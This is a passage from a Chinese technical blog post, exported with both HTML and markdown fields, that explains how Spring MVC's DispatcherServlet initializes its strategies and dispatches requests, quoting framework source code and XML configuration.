class=\"hljs-comment\">// default HandlerAdapters if no other adapters are found.</span>\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">this</span>.handlerAdapters == <span class=\"hljs-keyword\">null</span>) {\n<span class=\"hljs-keyword\">this</span>.handlerAdapters = getDefaultStrategies(context, HandlerAdapter.class);\n<span class=\"hljs-keyword\">if</span> (logger.isDebugEnabled()) {\nlogger.debug(<span class=\"hljs-string\">\"No HandlerAdapters found in servlet '\"</span> + getServletName() + <span class=\"hljs-string\">\"': using default\"</span>);\n}\n}\n}</code></pre>\n\n<p>看完上面的代码是否有种似曾相识的感觉？对的，上面代码的逻辑和<code>initHandlerMappings</code>一样，同样的你可以设置<code>detectAllHandlerAdapters</code>来改变代码的逻辑，你也可以看看我上面给你的默认strategy属性文件，就可以知道Spring MVC给你加载了哪些默认的HandlerAdapter对象。只要你理解了我上面initHandlerMappings方法的分析，这个方法就没有什么可说的了，和它一样。</p>\n\n\n\n<h2 id=\"inithandlerexceptionresolvers-方法\">InitHandlerExceptionResolvers 方法</h2>\n\n<p>这个方法中初始化的对象都为<code>HandlerExceptionResolver</code>的子类，对于Controller中出现的异常，会调用<code>processHandlerException</code>方法来统一处理异常。稍后我会详细介绍这些对象在处理异常时扮演的角色，大家现在有个印象就行。还有一点大家应该注意的就是，如果你自己并没有定义一个处理<code>HandlerExceptionResolver</code>的子类来处理异常，即使Spring MVC给你加载了默认的子类，它们也不会帮你处理异常的。这个方法的执行逻辑和上面的一样，这里我也就不多说了。</p>\n\n\n\n<h2 id=\"initviewresolvers-方法\">initViewResolvers 方法</h2>\n\n<p>逻辑依然和上面的初始化方法一样，你可以实现ViewResolver <br>\n 接口来定义自己的解析视图的方法。如果你并没有指定自己的类，那么默认的类为 <code>InternalResourceViewResolver</code>.</p>\n\n\n\n<h2 id=\"dispatcherservlet如何统领指挥\">DispatcherServlet如何“统领指挥”？</h2>\n\n<p>上面的初始化方法都是为真正的“战役”做准备的。在这一小节中，我会带大家看看DispatcherServlet是如何调动“千军万马”来打仗（处理来自客户端的请求）的。正如它的名字一样，<code>DispatcherServlet</code>也是一个Servlet，它间接继承自HttpServlet ，它也重写了doService方法。当从客户端发出一个请求时，它会首先执行它的doService方法，如果大家去看看这个方法，它其实就是在requset域中发布一些属性，然后调用doDispatch方法。这个方法才是实际做事情的方法。下面，来让我们看看doDispatch方法的真面目吧。由于这个方法中涉及到的方法很多并且它本身的方法也很长，因此在这一小节中我不会整段整段的复制代码，而是抽出重要的代码片段，对于一些方法来说，我也会去除掉一些没有用的代码，比如记录日志的代码。因此我建议大家打开自己的源码结合着下文一起看。</p>\n\n\n\n<h2 id=\"找到当前请求的handler\">找到当前请求的handler</h2>\n\n<p>从下面的代码中可以看到，<code>doDispatch</code>方法中调用getHandler方法找到相应请求的Handler，奇怪的是，返回的是一个<code>HandlerExecutionChain</code>对象，其实它很好理解，只不过是框架把找到的Handler（即我们处理请求的Controller）和一些个拦截器包装到这个对象中。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">HandlerExecutionChain mappedHandler = <span class=\"hljs-keyword\">null</span>;\n\nmappedHandler = getHandler(processedRequest, <span class=\"hljs-keyword\">false</span>);\n\n<span class=\"hljs-javadoc\">/**\n* Return the HandlerExecutionChain for this request.\n* &lt;p&gt;Tries all handler mappings in order.\n*<span class=\"hljs-javadoctag\"> @param</span> request current HTTP request\n*<span class=\"hljs-javadoctag\"> @return</span> the HandlerExecutionChain, or &lt;code&gt;null&lt;/code&gt; if no handler could be found\n*/</span>\n<span class=\"hljs-keyword\">protected</span> HandlerExecutionChain <span class=\"hljs-title\">getHandler</span>(HttpServletRequest request) <span class=\"hljs-keyword\">throws</span> Exception {\n<span class=\"hljs-keyword\">for</span> (HandlerMapping hm : <span class=\"hljs-keyword\">this</span>.handlerMappings) {\nHandlerExecutionChain handler = hm.getHandler(request);\n<span class=\"hljs-keyword\">if</span> (handler != <span class=\"hljs-keyword\">null</span>) {\n<span class=\"hljs-keyword\">return</span> handler;\n}\n}\n<span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">null</span>;\n}</code></pre>\n\n<p>上面代码中的getHandler方法实际就是遍历你上面初始化的HandlerMapping对象，然后用其找到相应的Handler，大家可以看到它的返回值实际是HandlerExecutionChain对象，如果大家继续Debug程序，它其实会把你定义的Handler和拦截器包装起来，一并返回。<strong>还有一点</strong>我想强调的是，每个HandlerMapping找到Controller的方式不同，如果大家自己跟踪一下断点，发现无论哪个HandlerMapping最终都会到<code>AbstractUrlHandlerMapping</code>类中的lookupHandler方法，这个类中其实还有个私有变量handlerMap，这个变量在容器启动的时候，Spring MVC已经把URL作为key，对应的Controller作为value存入到这个变量中。下面我给大家举个例子，假设现在我们定义的HandlerMapping为<code>DefaultAnnotationHandlerMapping</code>对象，下面我来介绍一下它映射URL到Controller大致的流程。 <br>\n* 当Servlet容器启动时，Spring MVC会实例化你所有定义的Bean，当然这绝对包括DefaultAnnotationHandlerMapping对象在实例化的过程中，它会调用<code>AbstractDetectingUrlHandlerMapping</code>中的<code>detectHandlers</code>方法，这个方法中会遍历你所有的Bean对象，甚至都会包括<code>DefaultAnnotationHandlerMapping</code>对象，从而找到URL以及相对应的Handler <br>\n* 在第2步中的detectHandlers方法中有一个<code>determineUrlsForHandler</code>方法，这个方法有主要作用是为给定的bean找到相应的URL，这个方法是抽象的，因此它会分派给具体的子类做这件事情，因为我用的是DefaultAnnotationHandlerMapping对象，所以会调用它里面的<code>determineUrlsForHandler</code>方法<code>DefaultAnnotationHandlerMapping</code>中的 <code>determineUrlsForHandler</code> <br>\n 方法首先会查看你给定的bean对象上是否有RequestMapping <br>\n 注解，然后会调用determineUrlsForHandlerMethods <br>\n 方法查找你这个bean中的方法上是否有RequestMapping <br>\n注解，如果在第4步中得到了一个URL和Controller的映射，那么<code>AbstractDetectingUrlHandlerMapping</code>中的detectHandlers方法会调用<code>AbstractUrlHandlerMapping</code>中的 registerHandler方法，把这个映射会放入它的域变量handlerMap中</p>\n\n<p>从上面的步骤中可以看出，Spring MVC在容器启动完毕以后就已经把所有的URL和Controller的映射放入到AbstractUrlHandlerMapping中的handlerMap域变量中，当请求到来时，它用URL当作key来取得对应的Controller就行了。<code>BeanNameUrlHandlerMapping</code>和 <code>DefaultAnnotationHandlerMapping</code>是同样的道理，只不过它们的<code>determineUrlsForHandler</code>方法不同。</p>\n\n<p><code>SimpleUrlHandlerMapping</code>这个类有点和它们不一样，它是基于配置把URL与Controller对应起来，而不是用<code>determineUrlsForHandler</code>方法来获取映射。剩下的步骤就一样了，用它里面的registerHandlers方法把这些映射注册到它的父类AbstractUrlHandlerMapping中。还有一些其它的HandlerMapping都是大同小异，这里我就不过多解释了。</p>\n\n\n\n<h2 id=\"找到handleradapter\">找到HandlerAdapter</h2>\n\n<p>上面已经根据URL找到相应的Handler，接下来我们需要找到与当前Handler相匹配的HandlerAdapter来调用方法处理请求。大家可能会想，我们已经找到了相应的Handler，直接调用它里面的方法处理请求不就行了吗？这样做是肯定不行的。如果大家对Spring MVC熟悉的话，就会知道定义一个Controller可以有要多种多样的方式。比如，我们可以实现Controller <br>\n 接口，也可以用注解的方式来定义Controller， 因此不同的定义方式会导致不同的调用方式。现在让我们来看看源码是怎么做的吧。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());\n\n<span class=\"hljs-javadoc\">/**\n* Return the HandlerAdapter for this handler object.\n*<span class=\"hljs-javadoctag\"> @param</span> handler the handler object to find an adapter for\n*<span class=\"hljs-javadoctag\"> @throws</span> ServletException if no HandlerAdapter can be found for the handler. This is a fatal error.\n*/</span>\n<span class=\"hljs-keyword\">protected</span> HandlerAdapter <span class=\"hljs-title\">getHandlerAdapter</span>(Object handler) <span class=\"hljs-keyword\">throws</span> ServletException {\n<span class=\"hljs-keyword\">for</span> (HandlerAdapter ha : <span class=\"hljs-keyword\">this</span>.handlerAdapters) {\n<span class=\"hljs-keyword\">if</span> (ha.supports(handler)) {\n<span class=\"hljs-keyword\">return</span> ha;\n}\n}\n}</code></pre>\n\n<p>源码看起来很简单，调用getHandlerAdapter方法就可以得到一个HandlerAdapter， 但是实际上并没有这么简单。这个方法就是遍历集合中的HandlerAdapter， 找到支持当前Handler的一个HandlerAdapter，那么怎么才算支持呢？实际上不同的HandlerAdapter所支持的方式不一样。下面，我拿出2个（<code>AnnotationMethodHandlerAdapter</code> <br>\n 和 <code>SimpleControllerHandlerAdapter</code>）大家最熟悉的HandlerAdapter的子类来看看到底哪里不一样？如果是SimpleControllerHandlerAdapter，这个就很简单了，它的supports方法只是去看看当前的Handler是否为Controller <br>\n接口的实例，如果是就支持。如果是<code>AnnotationMethodHandlerAdapter</code>，这个就有点复杂了。下面是具体的源码。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">final</span> Map&lt;Class&lt;?&gt;, ServletHandlerMethodResolver&gt; methodResolverCache =\n<span class=\"hljs-keyword\">new</span> ConcurrentHashMap&lt;Class&lt;?&gt;, ServletHandlerMethodResolver&gt;();\n\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">boolean</span> <span class=\"hljs-title\">supports</span>(Object handler) {\n<span class=\"hljs-keyword\">return</span> getMethodResolver(handler).hasHandlerMethods();\n}\n\n<span class=\"hljs-javadoc\">/**\n* Build a HandlerMethodResolver for the given handler type.\n*/</span>\n<span class=\"hljs-keyword\">private</span> ServletHandlerMethodResolver <span class=\"hljs-title\">getMethodResolver</span>(Object handler) {\nClass handlerClass = ClassUtils.getUserClass(handler);\nServletHandlerMethodResolver resolver = <span class=\"hljs-keyword\">this</span>.methodResolverCache.get(handlerClass);\n<span class=\"hljs-keyword\">if</span> (resolver == <span class=\"hljs-keyword\">null</span>) {\n<span class=\"hljs-keyword\">synchronized</span> (<span class=\"hljs-keyword\">this</span>.methodResolverCache) {\nresolver = <span class=\"hljs-keyword\">this</span>.methodResolverCache.get(handlerClass);\n<span class=\"hljs-keyword\">if</span> (resolver == <span class=\"hljs-keyword\">null</span>) {\nresolver = <span class=\"hljs-keyword\">new</span> ServletHandlerMethodResolver(handlerClass);\n<span class=\"hljs-keyword\">this</span>.methodResolverCache.put(handlerClass, resolver);\n}\n}\n}\n<span class=\"hljs-keyword\">return</span> resolver;\n}</code></pre>\n\n<p>在理解上面的代码之前，让我们先看看<code>ServletHandlerMethodResolver</code>和 <code>HandlerMethodResolver</code>这2个类。ServletHandlerMethodResolver是 AnnotationMethodHandlerAdapter的内部类，它继承了HandlerMethodResolver。在实例化ServletHandlerMethodResolver的同时，它会调用HandlerMethodResolver中的init()方法，在这个init()方法中会解析所有带有RequestMapping注解的方法，并把它存入到它的域变量handlerMethods中。 每个Handler都对应着一个<code>ServletHandlerMethodResolver</code>实例，这个实例中包含着一切关于当前Handler中的方法信息。 <br>\n那么上面代码中的supports方法首先做的就是调用getMethodResolver方法，用一个Handler实例去获取其对应的一ServletHandlerMethodResolver <br>\n实例，如果存在这个实例，直接返回，如果不存在，新建一个实例，并把它放入到Map缓存中。P.S. getMethodResolver方法的同步代码写的很漂亮，直得学习。 <br>\n总结来说，当第一次用到Handler中的方法处理请求时，它会一次性解析里面会用到的方法，存到一个ServletHandlerMethodResolver实例（当然了，这个实例不仅仅只有这些信息），然后用这个Handler类作为key，用ServletHandlerMethodResolver实例作为value存入到Map缓存中，等到下一个请求再一次用到这个Handler中的方法时，它直接从这个缓存中取得相应的信息就ok了。</p>\n\n\n\n<h2 id=\"应用注册拦截器的prehandle方法\">应用注册拦截器的preHandle方法</h2>\n\n<p>这一步没有什么好说的，大家自己看看下面的代码就全明白了。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-keyword\">int</span> interceptorIndex = -<span class=\"hljs-number\">1</span>;\n\n<span class=\"hljs-comment\">// Apply preHandle methods of registered interceptors.</span>\nHandlerInterceptor[] interceptors = mappedHandler.getInterceptors();\n<span class=\"hljs-keyword\">if</span> (interceptors != <span class=\"hljs-keyword\">null</span>) {\n<span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">int</span> i = <span class=\"hljs-number\">0</span>; i &lt; interceptors.length; i++) {\nHandlerInterceptor interceptor = interceptors[i];\n<span class=\"hljs-keyword\">if</span> (!interceptor.preHandle(processedRequest, response, mappedHandler.getHandler())) {\ntriggerAfterCompletion(mappedHandler, interceptorIndex, processedRequest, response, <span class=\"hljs-keyword\">null</span>);\n<span class=\"hljs-keyword\">return</span>;\n}\ninterceptorIndex = i;\n}\n}</code></pre>\n\n<p>实际上，除了我们自己的拦截器外，Spring MVC还给了一个拦截器为<code>AbstractUrlHandlerMapping$PathExposingHandlerInterceptor</code></p>\n\n\n\n<h2 id=\"调用处理请求的方法\">调用处理请求的方法</h2>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</code></pre>\n\n<p>上面的代码用相应的HandlerAdapter来调用Handler来处理请求了并返回一个ModelAndView对象。不同的HandlerAdapter调用方式也不相同，对于上面我介绍的SimpleControllerHandlerAdapter来说，它只是把Handler强转成了一个Controller，然后调用handleRequest方法就行了。 对于AnnotationMethodHandlerAdapter来说，如果你能理解上面“找到HandlerAdapter”的过程，相信这个也难不倒你。</p>\n\n<p><code>ModelAndView</code>是什么呢？它仅仅是一个容器存储Model 和 View，它们是完全不相同的东西，这所以这样做的原因就是在Controller <br>\n 当中可以用一个返回值同时返回Model 和 View，下面我来举个例子。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-annotation\">@Controller</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">HelloWorldController</span> {</span>\n<span class=\"hljs-annotation\">@RequestMapping</span>(<span class=\"hljs-string\">\"/hello\"</span>)\n<span class=\"hljs-keyword\">public</span> ModelAndView <span class=\"hljs-title\">helloWorld</span>() {\nString message = <span class=\"hljs-string\">\"Hello Spring MVC\"</span>;\n<span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> ModelAndView(<span class=\"hljs-string\">\"index.jsp\"</span>, <span class=\"hljs-string\">\"info\"</span>, message);\n}\n}</code></pre>\n\n<p>上面是我Controller中的代码，它返回的View名称为index.jsp， 而Model为<code>{info=Hello Spring MVC}</code></p>\n\n\n\n<h2 id=\"应用注册拦截器的posthandle方法\">应用注册拦截器的postHandle方法</h2>\n\n<p>这一步也没有什么好说的，大家自己看看下面的代码就全明白了。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-comment\">// Apply postHandle methods of registered interceptors.</span>\n<span class=\"hljs-keyword\">if</span> (interceptors != <span class=\"hljs-keyword\">null</span>) {\n<span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">int</span> i = interceptors.length - <span class=\"hljs-number\">1</span>; i &gt;= <span class=\"hljs-number\">0</span>; i--) {\nHandlerInterceptor interceptor = interceptors[i];\ninterceptor.postHandle(processedRequest, response, mappedHandler.getHandler(), mv);\n}\n}</code></pre>\n\n<p>在postHandle方法中，我们可以操纵从Controller中返回的ModelAndView对象，你可以替换它，清空它，向里面加入属性等。</p>\n\n\n\n<h2 id=\"渲染modelandview\">渲染ModelAndView</h2>\n\n<p>如果ModelAndView <br>\n 对象不为空，并且没有调用clear <br>\n 方法清空它，那么接下来它就会被渲染。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-keyword\">if</span> (mv != <span class=\"hljs-keyword\">null</span> &amp;&amp; !mv.wasCleared()) {\nrender(mv, processedRequest, response);\n<span class=\"hljs-keyword\">if</span> (errorView) {\nWebUtils.clearErrorRequestAttributes(request);\n}\n}\n<span class=\"hljs-keyword\">else</span> {\n<span class=\"hljs-keyword\">if</span> (logger.isDebugEnabled()) {\nlogger.debug(<span class=\"hljs-string\">\"Null ModelAndView returned to DispatcherServlet with name '\"</span> + getServletName() +\n<span class=\"hljs-string\">\"': assuming HandlerAdapter completed request handling\"</span>);\n}\n}</code></pre>\n\n<p>上面的render方法会从给定的ModelAndView对象中解析出一个View对象，然后就调用了render方法，这个方法是要属于AbstractView类的。如果大家看一下这个类的子类，你会发现各种各样的View对象，实在是太多了，比如：FreeMarkerView VelocityView InternalResourceView. AbstractView <br>\n类中的render方法的目的就是用给定的Model来预处理View对象，把静态属性和request域中的属性合并到模型当中，最后把这个合并过后的模型传递到具体子类的renderMergedOutputModel方法中，进行渲染。</p>\n\n\n\n<h2 id=\"应用注册拦截器的triggeraftercompletion方法\">应用注册拦截器的triggerAfterCompletion方法</h2>\n\n<p>到达这个阶段，整个doDispatch <br>\n 方法已经全部完毕了。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">triggerAfterCompletion(mappedHandler, interceptorIndex, processedRequest, response, <span class=\"hljs-keyword\">null</span>);</code></pre>\n\n\n\n<h2 id=\"异常处理\">异常处理</h2>\n\n<p>在上文中提到的initHandlerExceptionResolvers <br>\n 方法中，我已经提到了关于统一异常的处理。原理就在下面的代码之中。</p>\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-keyword\">catch</span> (ModelAndViewDefiningException ex) {\nlogger.debug(<span class=\"hljs-string\">\"ModelAndViewDefiningException encountered\"</span>, ex);\nmv = ex.getModelAndView();\n}\n<span class=\"hljs-keyword\">catch</span> (Exception ex) {\nObject handler = (mappedHandler != <span class=\"hljs-keyword\">null</span> ? mappedHandler.getHandler() : <span class=\"hljs-keyword\">null</span>);\nmv = processHandlerException(processedRequest, response, handler, ex);\nerrorView = (mv != <span class=\"hljs-keyword\">null</span>);\n}</code></pre>\n\n<p>上面的代码中有2个异常，一个是<code>ModelAndViewDefiningException</code>，对于这个异常来说，如果在你的Controller中抛出了这个异常并给定相应的ModelAndView， 它依然会在下面的代码中解析这个返回的ModelAndView <br>\n对象，如果没有指定ModelAndView，那么程序会出错。对于其它的异常来说，都会被Exception所捕获，接着会用processHandlerException方法去处理调用我们自己定义的异常处理方法。</p>\n\n\n\n<h2 id=\"总结\">总结</h2>\n\n<p>至此，我已经把Spring MVC工作的细节以源码的形式说完了。如果Spring MVC是个黒盒，那么这篇文章已经为大家打开了盒子并看到了里面主要的一些东西。这篇文章也为大家探索Spring MVC开了个好头，它让我们的开发者更进一步地了解了Spring MVC，而不仅仅是单纯地使用它。Spring MVC还有很多细节、优秀地设计思想以及漂亮地编码风格值得我们去探索和学习。下图是我Google一张关于Spring MVC的流程图，画得很详细，供大家参考。 <br>\n<img src=\"http://upload-images.jianshu.io/upload_images/1489067-078cff5b3aa8a763.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"spring MVC 流程图\" title=\"\">图片来源：<a href=\"http://www.programering.com/a/MDMyETNwATM.html\" target=\"_blank\">http://www.programering.com/a/MDMyETNwATM.html</a></p>",
			"markdowncontent":"## 引言\n一直以来都在使用Spring mvc，能够熟练使用它的各种组件。但是，它一直像个黑盒一样，我并不知道它内部是如何工作的，这几天一直在研究它的源码，今天已经把它的工作原理弄清了，因此把我的这个研究过程记录下来。现在让我们进入源码的世界，来看看这个黑盒中到底有什么神奇的东西。\n\n## spring MVC 总览\n\n**学一门新的知识，首先要大致了解它的全貌，然后在深入自己感兴趣的细节。**\n 那么在这一小节中，我不会去深入具体的细节了解spring MVC，而是去了解它大致的流程，它是如何工作起来的。首先，让我们先看看下面这张流程图。\n![spring MVC 流程图](http://upload-images.jianshu.io/upload_images/1489067-e0a90438b9d915f9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n图片来源：我从[Google Image](https://images.google.com/)。\n\n在接下来的文章中我会去深入源码来解释上图中的各个过程，现在大家对这张图有个概念就行。相信用过spring MVC的人都知道，客户端的请求要通过前端控制器(DispatcherServlet)，然后前端控制器去找到请求相应的`Controller`. 因此我们可以猜到前端控制器一定要在`Servlet`容器启动时被实例化，所以我们需要把`DispatcherServlet`配置到`web.xml`文件中，部分配置如下：\n```xml\n<servlet>\n<servlet-name>spring</servlet-name>\n<servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n<init-param>\n<param-name>contextConfigLocation</param-name>\n<param-value>classpath:spring.xml</param-value>\n</init-param>\n<load-on-startup>1</load-on-startup>\n</servlet>\n```\n如果你是Spring Team的一员，在实例化对象的时候，你会做些什么，大家好好想一想？Spring Team 一定会把一些后续要用到的东西进行初始化。接下来，让我们进入源码的世界吧，一层层揭开Spring MVC的面纱。\n\n## DispatcherServlet的实例化之旅\nDispatcherServlet的实例化之旅在这一小节中，我会通过查看Spring MVC的源码来看看在DispatcherServlet实例化的过程中，Spring到底初始化了一些什么的东西。\n* DispatcherServlet中的静态代码块\n```java\n/**\n* Name of the class path resource (relative to the DispatcherServlet class)\n* that defines DispatcherServlet's default strategy names.\n*/\nprivate static final String DEFAULT_STRATEGIES_PATH = \"DispatcherServlet.properties\";\nprivate static final Properties defaultStrategies;\nstatic {\n// Load default strategy implementations from properties file.\n// This is currently strictly internal and not meant to be customized\n// by application developers.\ntry {\nClassPathResource resource = new ClassPathResource(DEFAULT_STRATEGIES_PATH, DispatcherServlet.class);\ndefaultStrategies = PropertiesLoaderUtils.loadProperties(resource);\n}\ncatch (IOException ex) {\nthrow new IllegalStateException(\"Could not load 'DispatcherServlet.properties': \" + ex.getMessage());\n}\n}\n```\n\n当一个类被JVM加载、链接过后，JVM会调用类构造器会初始化一些静态域对象。因此上面的静态代码块会被执行，其中的代码只有一个目的，那就是从属性文件中加载默认的strategy实现，最后赋值给`defaultStrategies`变量。查看spring-webmvc jar包内部的结构。结果如下图：\n\n![image.png](http://upload-images.jianshu.io/upload_images/1489067-18d778170c9b27da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n大家可以打开DispatcherServlet.properties文件，可以看到如下内容：\n```properties\n# Default implementation classes for DispatcherServlet's strategy interfaces.\n# Used as fallback when no matching beans are found in the DispatcherServlet context.\n# Not meant to be customized by application developers.\n\norg.springframework.web.servlet.LocaleResolver=org.springframework.web.servlet.i18n.AcceptHeaderLocaleResolver\n\norg.springframework.web.servlet.ThemeResolver=org.springframework.web.servlet.theme.FixedThemeResolver\n\norg.springframework.web.servlet.HandlerMapping=org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,\\\norg.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping\n\norg.springframework.web.servlet.HandlerAdapter=org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter,\\\norg.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter,\\\norg.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter\n\norg.springframework.web.servlet.HandlerExceptionResolver=org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerExceptionResolver,\\\norg.springframework.web.servlet.mvc.annotation.ResponseStatusExceptionResolver,\\\norg.springframework.web.servlet.mvc.support.DefaultHandlerExceptionResolver\n\norg.springframework.web.servlet.RequestToViewNameTranslator=org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator\n\norg.springframework.web.servlet.ViewResolver=org.springframework.web.servlet.view.InternalResourceViewResolver\n\norg.springframework.web.servlet.FlashMapManager=org.springframework.web.servlet.support.SessionFlashMapManager\n```\n相信大家一定熟悉里面的一些类吧，别着急，下面会用到这些东西，大家现在有个印象就行。在context成功的refresh过后，`onRefresh`方法就会被调用，然后它会调用initStrategies方法。下面让我们来看看initStrategies方法具体都初始化哪些strategy对象。\n\n* strategy对象的初始化)strategy对象的初始化\n```java\n/**\n* Initialize the strategy objects that this servlet uses.\n* <p>May be overridden in subclasses in order to initialize further strategy objects.\n*/\nprotected void initStrategies(ApplicationContext context) {\ninitMultipartResolver(context);\ninitLocaleResolver(context);\ninitThemeResolver(context);\ninitHandlerMappings(context);\ninitHandlerAdapters(context);\ninitHandlerExceptionResolvers(context);\ninitRequestToViewNameTranslator(context);\ninitViewResolvers(context);\ninitFlashMapManager(context);\n}\n```\n对于上面的各个初始化方法，我只讲解几个与我们开发者最密切的初始化方法，它们分别是`initHandlerMappings`, `initHandlerAdapters`, `initHandlerExceptionResolvers`,` initViewResolvers`。 如果大家对其它方法感兴趣，自己去查看一下相应的源码。下面让我们来深入各个初始化方法的细节。\n* initHandlerMappings 方法\n这个方法的作用是初始化我们程序将要用到的HandlerMapping对象，下面让我们来看看源码。源码如下：\n```java\n/** List of HandlerMappings used by this servlet */\nprivate List<HandlerMapping> handlerMappings;\n\n/** Detect all HandlerMappings or just expect \"handlerMapping\" bean? */\nprivate boolean detectAllHandlerMappings = true;\n\n/**\n* Initialize the HandlerMappings used by this class.\n* <p>If no HandlerMapping beans are defined in the BeanFactory for this namespace,\n* we default to BeanNameUrlHandlerMapping.\n*/\nprivate void initHandlerMappings(ApplicationContext context) {\nthis.handlerMappings = null;\n\nif (this.detectAllHandlerMappings) {\n// Find all HandlerMappings in the ApplicationContext, including ancestor contexts.\nMap<String, HandlerMapping> matchingBeans =\nBeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerMapping.class, true, false);\nif (!matchingBeans.isEmpty()) {\nthis.handlerMappings = new ArrayList<HandlerMapping>(matchingBeans.values());\n// We keep HandlerMappings in sorted order.\nOrderComparator.sort(this.handlerMappings);\n}\n}\nelse {\ntry {\nHandlerMapping hm = context.getBean(HANDLER_MAPPING_BEAN_NAME, HandlerMapping.class);\nthis.handlerMappings = Collections.singletonList(hm);\n}\ncatch (NoSuchBeanDefinitionException ex) {\n// Ignore, we'll add a default HandlerMapping later.\n}\n}\n\n// Ensure we have at least one HandlerMapping, by registering\n// a default HandlerMapping if no other mappings are found.\nif (this.handlerMappings == null) {\nthis.handlerMappings = getDefaultStrategies(context, HandlerMapping.class);\nif (logger.isDebugEnabled()) {\nlogger.debug(\"No HandlerMappings found in servlet '\" + getServletName() + \"': using default\");\n}\n}\n}\n```\n在了解上面代码的意义之前，让我们来看看我的spring.xml\n 文件中都配置了什么。\n```xml\n<context:component-scan base-package=\"me.xurtle\" />\n<bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\">\n<property name=\"prefix\" value=\"/\" />\n<property name=\"suffix\" value=\".jsp\" />\n</bean>\n```\n大家可以看到，我没有在spring的配置文件配置任何的HandlerMapping对象。从上面的代码我们可以看出`detectAllHandlerMappings`默认为true，也就是默认会去检测配置文件中所有的HandlerMapping，接下来是`beansOfTypeIncludingAncestors`方法，如果你去查看这个方法的源码，你会看到它的第一个参数给定的是`ListableBeanFactory`接口，对于这个接口的实现类来说，它可以枚举出所有定义的bean实例，而不是仅仅可以通过bean名称去获得定义的bean实例。那`beansOfTypeIncludingAncestors`具体的做法就是枚举出所有定义的bean，筛选出给定类型或其子类的bean，如果第一个参数是`HierarchicalBeanFactory`的子类，它也会去查找父类工厂中的HandlerMapping，最后返回一个Map对象。\n\n如果返回的Map对象中存在HandlerMapping对象，那么接下来会把这些对象存入到ArrayList中。同样它也会保持HandlerMapping对象在集合中的顺序，大家可能会觉得奇怪，为什么要保持这些对象的顺序呢？其实很简单，等我下面分析到映射请求的时候，大家就会明白了。\n\n如果一直都没有获得到HandlerMapping对象，那么接下来的`getDefaultStrategies`方法会给我们生成一些默认的HandlerMapping对象。其实这个方法也很简单，它其实就是用我们给定的strategy对象接口的名字作为key，接着去属性文件中加载对应的值。而这个属性文件就是上面我分析的静态代码块中初始化的那个属性文件。接着它会用StringUtils\n 工具类把拿到的value根据逗号分开存入到String数组中，然后遍历这些名字，根据相应的名字加载相应的类，创建相应的对象。不得不说，这个方法的实现真的很好，它只写这一个方法，就可以加载不同的strategy对象，实现了代码的重用，值得我们学习。\n\n如果你Debug一下程序，你可以看到handlerMappings\n 列表中其实有两个实例，第一个是`BeanNameUrlHandlerMapping`，第二个是`DefaultAnnotationHandlerMapping`，就象我前面说的那样，Spring MVC会使用列表中的第一个对象，即`BeanNameUrlHandlerMapping`的对象，如果通过这个对象并没有找到相应的handler，然后才会使用`DefaultAnnotationHandlerMapping`的对象。\n\n至此，我们还一个逻辑没有介绍。如果想让initHandlerMappings方法走这个逻辑，我们需要把detectAllHandlerMappings设置为**false**.其实这个很简单，只要在**web.xml**文件中配置一下就行了。部分代码如下：\n```xml\n<servlet>\n<servlet-name>spring</servlet-name>\n<servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n<init-param>\n<param-name>contextConfigLocation</param-name>\n<param-value>classpath:spring.xml</param-value>\n</init-param>\n<init-param>\n<param-name>detectAllHandlerMappings</param-name>\n<param-value>false</param-value>\n</init-param>\n<load-on-startup>1</load-on-startup>\n</servlet>\n```\n除了上面的代码外，我们还需要在spring.xml\n 文件中定义一个HandlerMapping，部分代码如下：\n\n```xml\n<bean name=\"handlerMapping\" class=\"org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping\" />\n```\n你的bean名称一定为handlerMapping，不可以是其它的值。如果你把这个名称指定为其它的值，Spring框架不能得到这个bean，它依然会给你默认的HandlerMapping对象。\n\n> **总结：**通过上面源码的分析可以看出，在spring配置文件中明确指定一个bean名称为handlerMapping的做法更有效，因为它不需要去遍历配置文件中所有的bean，所以这个做法会加快initHandlerMappings方法的执行。\n\n## initHandlerAdapters 方法\n这个方法的作用是初始化我们程序将要用到的HandlerAdapter对象，下面让我们来看看源码。源码如下：\n```java\n/** List of HandlerAdapters used by this servlet */\nprivate List<HandlerAdapter> handlerAdapters;\n\n/** Detect all HandlerAdapters or just expect \"handlerAdapter\" bean? */\nprivate boolean 